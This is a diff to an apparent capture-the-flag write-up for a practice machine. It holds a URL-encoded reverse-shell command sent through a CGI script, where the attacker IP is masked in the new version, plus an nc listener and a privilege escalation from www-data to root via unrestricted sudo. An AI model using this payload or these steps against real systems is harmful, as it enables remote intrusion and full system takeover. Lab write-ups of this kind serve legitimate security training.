@@ -169,10 +169,25 @@ tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*
 
 <h2>get reverse shell </h2>
 
-https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.30.202%204444%20%3E%2Ftmp%2Ff
+https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.x.x.x%204444%20%3E%2Ftmp%2Ff
 
 
+nc -lvnp 4444
 
+<h2>PrivEsc</h2>
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
+sudo su
+/usr/bin/script -qc /bin/bash /dev/null
+root@ubuntu:/usr/lib/cgi-bin# id
+id
+uid=0(root) gid=0(root) groups=0(root)
 
 </code>
 
